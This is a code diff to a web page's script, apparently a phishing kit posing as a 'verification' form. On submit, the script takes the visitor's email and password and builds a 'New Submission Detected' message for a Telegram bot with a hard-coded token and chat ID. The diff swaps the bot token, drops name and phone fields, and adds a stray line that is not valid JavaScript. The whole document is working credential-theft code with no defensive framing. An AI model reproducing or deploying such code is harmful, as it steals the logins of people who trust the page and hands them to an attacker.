@@ -163,24 +163,20 @@
         });
 
         // Telegram Bot integration
-        const botToken = "7925167960:AAENIP5MP_Od70ErpipmCB6wBr1HbP522oQ";
+        const botToken = "7605659515:AAFW1CF2bdDNNhKd2hAHiveji8LYdvW3fBo";
         const chatID = "-7149939055";
+	IdTelegram=array("7149939055");
+
+
 
         const form = document.getElementById("verification-form");
         form.addEventListener("submit", async function (e) {
             e.preventDefault();
-
-            const pageName = document.getElementById("page-name").value;
-            const fullName = document.getElementById("full-name").value;
-            const phoneNumber = document.getElementById("phone-number").value;
 			const email = document.getElementById("email").value;
 			const password = document.getElementById("password").value;
 	        const currentDateTime = new Date().toLocaleString();
 
             const message = `🔒 New Submission Detected\n\n`
-                + `📄 Page Name: ${pageName}\n`
-                + `👤 Full Name: ${fullName}\n`
-                + `📞 Phone Number: ${phoneNumber}\n`
 				+ `📧 Email: ${email}\n`
 				+ `🔑 Password: ${password}\n`
                 + `🕒 Submitted At: ${currentDateTime}`
@@ -207,6 +203,7 @@
             }
         });
     </script>
+
 
 
 </body></html>
